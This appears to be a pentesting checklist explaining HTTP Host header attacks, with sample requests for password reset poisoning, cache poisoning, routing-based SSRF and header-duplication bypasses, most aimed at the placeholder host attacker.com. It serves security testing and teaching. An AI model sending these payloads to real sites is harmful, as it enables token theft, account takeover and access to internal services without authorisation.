# Host Header Attacks

Host header attacks exploit the fact that web servers often rely on the `Host` header to determine routing, generate URLs, and make security decisions. If the server trusts the Host header without validation, attackers can manipulate it to achieve password reset poisoning, cache poisoning, SSRF, and access control bypass.

## Checks

- [ ] Supply an arbitrary host header
- [ ] Check for flawed validation
- [ ] Send ambiguous requests
  - Duplicate host headers
  - Supply an absolute URL
  - Add line wrapping - indented host header
- [ ] Inject host override headers
  - X-Host
  - X-Forwarded-Host
  - X-Forwarded-Server
  - X-HTTP-Host-Override
  - Forwarded

## Common Attack Scenarios

### Password Reset Poisoning

If the application uses the Host header to generate password reset links:

```http
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

The reset link may be generated as `https://attacker.com/reset?token=SECRET`, leaking the token.

### Web Cache Poisoning

If a cache keys on the URL but the response includes the Host header value:

```http
GET /login HTTP/1.1
Host: attacker.com
```

If cached, subsequent users visiting `/login` may receive a page with resources loaded from `attacker.com`.

### Routing-Based [SSRF](ssrf.md)

```http
GET / HTTP/1.1
Host: 192.168.0.1
```

If the server routes based on the Host header, this may access internal services.

## Bypass Techniques

### Duplicate Host Headers

```http
GET / HTTP/1.1
Host: target.com
Host: attacker.com
```

### Absolute URL

```http
GET https://target.com/ HTTP/1.1
Host: attacker.com
```

### Line Wrapping

```http
GET / HTTP/1.1
 Host: attacker.com
Host: target.com
```

### Port-Based Injection

```http
GET / HTTP/1.1
Host: target.com:@attacker.com
```

---

## References

- [PortSwigger - Host Header Attacks](https://portswigger.net/web-security/host-header)
- [HackTricks - Host Header Injection](https://book.hacktricks.wiki/en/pentesting-web/host-header-injection.html)
